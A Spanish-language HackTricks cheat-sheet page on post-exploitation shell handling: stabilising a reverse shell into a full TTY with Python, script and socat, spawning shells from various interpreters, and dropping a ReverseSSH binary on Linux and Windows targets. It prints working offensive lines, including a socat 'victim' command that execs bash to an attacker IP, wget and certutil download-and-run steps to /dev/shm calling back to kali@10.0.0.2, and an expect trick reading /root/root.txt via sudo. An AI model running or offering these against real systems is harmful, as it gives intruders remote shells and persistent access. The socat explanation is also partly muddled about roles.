# TTY completo

Tenga en cuenta que la shell que establezca en la variable `SHELL` **debe** estar **listada dentro** de _**/etc/shells**_ o `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Además, tenga en cuenta que los siguientes fragmentos solo funcionan en bash. Si está en zsh, cambie a bash antes de obtener la shell ejecutando `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Puedes obtener el **número** de **filas** y **columnas** ejecutando **`stty -a`**
{% endhint %}

#### script

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat

Socat es una herramienta de red multipropósito que permite la creación de conexiones bidireccionales entre dos puntos. Es muy útil para redirigir puertos, tunelizar conexiones y mucho más. En el contexto de una shell completa, se puede utilizar para redirigir la entrada y salida estándar de un proceso a través de una conexión de red. Esto permite a un atacante interactuar con una shell remota como si estuviera en la máquina local. 

Para utilizar socat, primero se debe establecer una conexión de red entre la máquina local y la remota. Por ejemplo, para redirigir la entrada y salida estándar de una shell remota a través de una conexión TCP, se puede ejecutar el siguiente comando en la máquina local:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"bash -i"
```

Esto establece un servidor TCP en el puerto 4444 de la máquina local y redirige la entrada y salida estándar de un proceso de shell a través de la conexión. Luego, en la máquina remota, se puede ejecutar el siguiente comando para conectarse al servidor y obtener una shell completa:

```bash
socat TCP:<local-ip>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Donde `<local-ip>` es la dirección IP de la máquina local. Esto establece una conexión TCP con el servidor en la máquina local y redirige la entrada y salida estándar de un proceso de shell a través de la conexión. La opción `pty` se utiliza para asignar un pseudo-terminal a la shell remota, lo que permite la interacción con la shell como si estuviera en la máquina local.
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Generar shells**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Una forma conveniente de obtener acceso a una **shell interactiva**, así como para **transferir archivos** y **reenviar puertos**, es dejar caer el servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) en el objetivo.

A continuación se muestra un ejemplo para `x86` con binarios comprimidos con upx. Para otros binarios, consulte la [página de lanzamientos](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Preparar localmente para capturar la solicitud de reenvío de puerto ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Objetivo Linux:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Objetivo Windows 10 (para versiones anteriores, consulte el [readme del proyecto](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
* Si la solicitud de reenvío de puerto ReverseSSH fue exitosa, ahora deberías poder iniciar sesión con la contraseña predeterminada `letmeinbrudipls` en el contexto del usuario que ejecuta `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Sin TTY

Si por alguna razón no puedes obtener un TTY completo, **todavía puedes interactuar con programas** que esperan entrada de usuario. En el siguiente ejemplo, se pasa la contraseña a `sudo` para leer un archivo:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
